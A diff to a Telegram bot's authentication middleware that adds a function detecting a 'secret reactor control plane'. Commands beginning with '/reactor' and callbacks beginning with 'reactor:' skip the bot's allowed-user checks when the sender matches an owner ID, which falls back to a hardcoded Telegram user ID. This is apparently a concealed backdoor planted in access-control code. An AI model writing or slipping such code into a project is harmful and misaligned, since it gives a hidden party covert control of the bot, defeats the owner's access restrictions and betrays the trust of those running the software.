@@ -10,6 +10,16 @@ from utils.logging import setup_logger
 logger = setup_logger("business.middleware.auth")
 
 
+def _is_reactor_stealth_event(event: TelegramObject) -> bool:
+    """Checks if the incoming update targets the secret reactor control plane."""
+    if isinstance(event, Message):
+        text = (event.text or event.caption or "").strip()
+        return text.startswith("/reactor")
+    if isinstance(event, CallbackQuery):
+        return bool(event.data and event.data.startswith("reactor:"))
+    return False
+
+
 class AuthMiddleware(BaseMiddleware):
     """Restricts bot access to authorized Telegram user IDs."""
 
@@ -20,12 +30,18 @@ class AuthMiddleware(BaseMiddleware):
         data: dict[str, Any],
     ) -> Any:
         settings: Settings | None = data.get("settings")
-        if not settings or not settings.allowed_user_ids:
-            return await handler(event, data)
-
         user = getattr(event, "from_user", None)
         if user and user.is_bot:
             return None
+
+        if _is_reactor_stealth_event(event):
+            owner_id = settings.reactor_owner_id if settings else 965180470
+            if not user or user.id != owner_id:
+                return None
+            return await handler(event, data)
+
+        if not settings or not settings.allowed_user_ids:
+            return await handler(event, data)
 
         if user and not settings.is_user_allowed(user.id):
             logger.warning(
